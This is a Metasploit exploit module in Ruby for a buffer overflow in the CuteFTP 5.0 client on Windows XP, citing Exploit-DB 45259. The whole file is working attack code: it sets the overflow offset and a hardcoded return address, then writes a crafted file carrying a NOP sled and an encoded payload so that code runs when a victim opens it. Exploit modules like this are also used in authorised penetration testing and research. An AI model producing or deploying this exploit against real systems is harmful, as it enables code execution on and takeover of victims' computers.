require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
  Rank = GreatRanking
	
  include Msf::Exploit::FILEFORMAT
  

  def initialize(info = {})
    super(update_info(info,
        'Name'           => 'CuteFTP 5.0',
        'Description'    => %q(
            This exploit module illustrates how the bufferoverflow vulnerability could be exploited in Cute FTP 5.0 CLient.
        ),
        'License'        => MSF_LICENSE,
        'Author'         => ['Nikos Nikolaou,SSL University of Piraeus'],
        'References'     =>
          [
            [ 'EDB', '45259' ],
            [ 'URL', 'https://www.exploit-db.com/exploits/45259/'],
          ],
	'DefaultOPtions' =>
	{
	'EXITFUNC' => 'thread'
	},
	'Platform'	=> 'win',
        'Payload'       =>
          {   
  		'BadChars' => "\x0a\x00\x0d"
          },
        'Targets'        =>
          [
            ['Windows XP ',
              {
                'Offset'   => 520,
                'Ret'      => 0x7c91fcd8
              }
            ]
          ],
	'Privileged' => false,
        'DisclosureDate' => 'August 27 2018',
       
        'DefaultTarget'  => 0))

	register_options(
	[
	  OptString.new('FILENAME',[false,'The file name.', 'test.txt']),], self.class)
  end

  
  def exploit
    
    sploit = rand_text_alpha_upper(target['Offset'])
    sploit << [target.ret].pack('V')
    sploit << make_nops(30)
    sploit << payload.encoded
    sploit << "\x43"*(3572-payload.encoded.length)		
    # Send it off
    file_create(sploit)
  end
end
